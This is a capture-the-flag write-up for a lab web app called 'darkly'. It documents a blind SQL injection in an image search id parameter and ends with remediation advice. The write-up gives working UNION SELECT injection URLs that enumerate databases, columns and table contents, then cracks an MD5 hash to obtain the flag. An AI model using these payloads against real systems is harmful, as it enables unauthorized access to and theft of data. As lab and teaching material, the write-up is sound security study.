HOW WE FOUND IT
On main page, find search image page

parameter is an id for images, try it normally (1, 2, 3...), different images informations get returned
Question: How is this ID processed in the backend ? Is it through a SQL request ?

test for basic quote injection (1'), we don't get a SQL error message 

we make a simple boolean test case to verify if an injection would work without quotes (1 and 1=1 | 1 and 1=0)

BINGO ! the first image data (id 1) gets returned when using the 1 and 1=1 injection, and nothing gets returned when using 1 and 1=0 !
That's how the query must look like on the backend :
SELECT (?) from list_images where id=1 or 1=1

We know we have to deal with a (partly) BLIND SQL injection

We now can procceed to enumerate the database, looking for juicy information...

enum all databases :
http://darkly/?page=searchimg&id=1+UniOn+Select+1%2CgRoUp_cOncaT%280x7c%2Cschema_name%2C0x7c%29+fRoM+information_schema.schemata&Submit=Submit#

enum all tables and columns in all databases :
http://darkly/?page=searchimg&id=1+union+select+column_name%2Ctable_name+from+information_schema.columns&Submit=Submit#

enum comments for all entries in list_images :
http://darkly/?page=searchimg&id=1+or+1%3D1+union+select+comment%2Ctitle+from+list_images&Submit=Submit#

found md5 : 1928e8083cf461a51303633093573c46 --> md5sum of albatroz

echo -n "albatroz" | sha256sum --> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 

SUCCESS ! We got the flag :)

PROBLEM
The image ID lookup is vulnerable to (partly) BLIND SQL injections. It is possible for an unauthenticated user to enumerate the whole database, compromising the entirety of the platform's confidentiality, and potentially its integrity too (using INSERT statements, DROP...).

SOLUTION
- Use frameworks instead of building SQL queries by hand
- Separate very clearly code from text, sanitizing the user input as much as possible, and being very careful when processing and using this user input
- The SQL account running the code should have as few privileges as possible, in order for an attacker to get limited power in case of SQL injection
- Use parametarized queries, which are way less vulnerable to SQL injections (https://www.php.net/manual/en/mysqli.prepare.php)
